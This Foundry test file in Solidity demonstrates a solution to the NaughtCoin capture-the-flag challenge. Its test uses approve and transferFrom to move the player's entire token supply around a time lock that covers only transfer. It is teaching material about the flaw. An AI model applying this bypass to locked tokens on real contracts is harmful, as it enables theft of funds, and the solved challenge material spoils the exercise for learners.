// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

/**
 * @title NaughtCoin Vulnerability Demonstration
 * @notice Demonstrates the bypass of the time lock in the NaughtCoin contract using ERC20 functions
 *
 * @dev The vulnerability exists because:
 * - The `transfer` function includes a time lock for the initial owner.
 * - However, the `approve` and `transferFrom` functions are not restricted by this time lock.
 *
 * Attack flow:
 * 1. Owner uses `approve` to allow another address to manage a certain amount of their tokens.
 * 2. The approved address then uses `transferFrom` to move the tokens on behalf of the owner, bypassing the time lock.
 */
import {Test, console} from "forge-std/Test.sol";
import {NaughtCoin} from "../src/NaughtCoin.sol";

contract NaughtCoinTest is Test {
    NaughtCoin public victim;
    address public player;

    function setUp() public {
        player = makeAddr("player");
        victim = new NaughtCoin(player);
    }

    function test_attack() public {
        vm.startPrank(player);
        victim.approve(address(this), victim.INITIAL_SUPPLY());
        vm.stopPrank();
        victim.transferFrom(player, address(this), victim.INITIAL_SUPPLY());

        assertEq(victim.balanceOf(player), 0, "Player should have 0 balance");
        assertEq(victim.balanceOf(address(this)), victim.INITIAL_SUPPLY(), "Attacker should have the initial supply");
    }
}
